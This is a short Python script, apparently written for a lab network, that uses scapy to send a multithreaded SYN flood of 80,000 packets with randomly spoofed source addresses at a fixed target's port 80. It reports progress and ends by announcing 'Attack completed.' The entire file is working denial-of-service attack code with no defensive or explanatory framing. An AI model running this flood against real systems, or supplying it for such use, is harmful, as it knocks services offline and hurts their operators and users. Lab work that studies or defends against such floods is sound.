#!/usr/bin/env python3

from scapy.all import IP, TCP, send
import random
import threading

# Target configuration
TARGET_IP = "192.168.56.103"
TARGET_PORT = 80
TOTAL_PACKETS = 80000
THREAD_COUNT = 4  # You can adjust this (e.g., 8, 16, etc.)

def send_packets(start_idx, packet_count, thread_id):
    for i in range(packet_count):
        spoofed_ip = f"192.168.56.{random.randint(1, 254)}"
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)

        ip = IP(src=spoofed_ip, dst=TARGET_IP)
        tcp = TCP(sport=sport, dport=TARGET_PORT, flags="S", seq=seq)
        pkt = ip / tcp

        send(pkt, verbose=0)

        if (i + 1) % 2000 == 0:
            print(f"[Thread-{thread_id}] Sent {i + 1} packets")

    print(f"[Thread-{thread_id}] Finished sending packets.")

# Divide packets among threads
packets_per_thread = TOTAL_PACKETS // THREAD_COUNT
threads = []

print(f"[+] Launching SYN flood with {TOTAL_PACKETS} packets using {THREAD_COUNT} threads...\n")

for t_id in range(THREAD_COUNT):
    thread = threading.Thread(target=send_packets, args=(t_id * packets_per_thread, packets_per_thread, t_id))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()

print("\n[+] Attack completed.")
